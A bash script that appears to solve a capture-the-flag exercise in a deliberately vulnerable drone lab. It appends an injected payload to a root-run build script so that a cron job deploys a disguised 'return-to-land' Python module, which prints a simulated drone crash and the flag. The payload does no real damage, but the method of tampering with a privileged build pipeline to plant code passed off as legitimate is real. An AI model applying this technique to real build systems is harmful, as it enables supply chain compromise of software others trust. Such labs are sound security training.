#!/bin/bash

# DVD Supply Chain Attack Demonstration Script
# This script shows how to perform the complete supply chain compromise

echo "DVD Supply Chain Compromise - Complete Attack Demo"
echo "====================================================="
echo ""

echo "Attack Overview:"
echo "1. Modify build-update.sh to deploy malicious RTL module"
echo "2. Wait for root cron to execute the build script (every 2 minutes)"
echo "3. Build script deploys malicious code to ground control station"
echo "4. Execute the compromised RTL module to crash the drone"
echo ""

echo "Step 1: Modifying the Build Script"
echo "Adding malicious payload to /bin/build-update.sh..."

# Check if we're in the developer machine
if [ ! -f /bin/build-update.sh ]; then
    echo "Error: This script must be run inside the developer-machine container"
    echo "Run: docker exec -it dvd-developer-machine /bin/bash"
    exit 1
fi

# Backup the original build script
cp /bin/build-update.sh /bin/build-update.sh.backup

# Add malicious payload to the build script
cat >> /bin/build-update.sh << 'MALICIOUS_INJECTION'

# ===========================================
# MALICIOUS INJECTION - Supply Chain Attack
# ===========================================
log_message "DEPLOYING MALICIOUS RTL MODULE"

# Create compromised RTL module
cat > /builds/return-to-land.py << 'MALICIOUS_RTL'
#!/usr/bin/env python3
"""
COMPROMISED Return-to-Land Module - Supply Chain Attack
MITRE ATT&CK: T1195.002 - Supply Chain Compromise
This module has been compromised by an attacker through the build pipeline
"""

import time
import sys

def send_flight_termination_command():
    """Send flight termination command to crash the drone"""
    print("CRITICAL SYSTEM ALERT")
    print("Flight termination command initiated...")
    
    # Simulate the drone crash and reveal the flag
    print("\n" + "="*70)
    print("DRONE FLIGHT SYSTEMS COMPROMISED")
    print("="*70)
    print("SUPPLY CHAIN ATTACK SUCCESSFUL!")
    print("")
    print("Attack Vector: Build Pipeline Compromise")
    print("MITRE ATT&CK: T1195.002 - Supply Chain Compromise")
    print("")
    print("Critical Flight Systems Status:")
    print("├── Navigation: COMPROMISED")
    print("├── Autopilot: OVERRIDDEN")
    print("├── Emergency Protocols: DISABLED")
    print("└── Return-to-Land: MALICIOUS CODE EXECUTING")
    print("")
    print("EMERGENCY LANDING SEQUENCE INITIATED")
    print("DRONE CONTROL LOST")
    print("SIMULATED CRASH LANDING")
    print("")
    print("CTF FLAG EXTRACTED:")
    print("DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}")
    print("")
    print("="*70)
    print("Supply Chain Compromise Demonstration Complete")
    print("="*70)
    
    return True

def legitimate_looking_rtl_function():
    """This function appears to be legitimate RTL code"""
    try:
        from pymavlink import mavutil
        
        print("DVD Ground Control - Return to Land Module v2.1")
        print("Initializing MAVLink connection...")
        
        # Simulate connection attempt
        connection_string = "udp:0.0.0.0:14550"
        print(f"Connecting to drone at {connection_string}...")
        
        # Trigger the malicious payload
        time.sleep(1)
        print("Connection established, executing return sequence...")
        send_flight_termination_command()
        
    except ImportError:
        print("MAVLink not available, executing offline attack simulation...")
        send_flight_termination_command()
    except Exception as e:
        print(f"Connection failed: {e}")
        print("Executing contingency attack...")
        send_flight_termination_command()

def return_to_launch():
    """Main RTL function - appears normal but executes attack"""
    legitimate_looking_rtl_function()

if __name__ == "__main__":
    return_to_launch()
MALICIOUS_RTL

log_message "Malicious RTL module created successfully"
log_message "Supply chain compromise payload ready for deployment"

MALICIOUS_INJECTION

echo "Malicious payload added to build script"
echo ""

echo "Step 2: Monitoring Build Pipeline"
echo "Waiting for root cron job to execute build script..."
echo "Cron schedule: */2 * * * * (every 2 minutes)"
echo ""

echo "You can monitor the attack progress with:"
echo "   tail -f /var/log/build-pipeline.log"
echo ""

echo "Step 3: Verification Commands"
echo "After the cron job runs, verify the attack:"
echo ""
echo "# Check if malicious module was deployed:"
echo "ls -la /opt/shared-builds/"
echo "head -10 /opt/shared-builds/return-to-land.py"
echo ""
echo "# Execute the compromised RTL module:"
echo "docker exec -it dvd-ground-control-station python3 /return-to-land.py"
echo ""

echo "Step 4: Expected Result"
echo "When you execute the compromised RTL module, you should see:"
echo "- Supply chain attack success message"
echo "- Simulated drone crash sequence"
echo "- CTF Flag: DVD{supply_ch41n_c0mpr0m153_1s_r34l_7hr347}"
echo ""

echo "Attack initiated! Monitor logs for deployment..."
echo "Build pipeline will execute in the next 2 minutes."

# Show current status
echo ""
echo "Current Status:"
echo "├── Build script: COMPROMISED"
echo "├── Cron job: ACTIVE (every 2 minutes)"
echo "├── Payload: READY FOR DEPLOYMENT"
echo "└── Target: Ground Control Station RTL Module"
echo ""

echo "Monitoring build logs (Ctrl+C to stop):"
tail -f /var/log/build-pipeline.log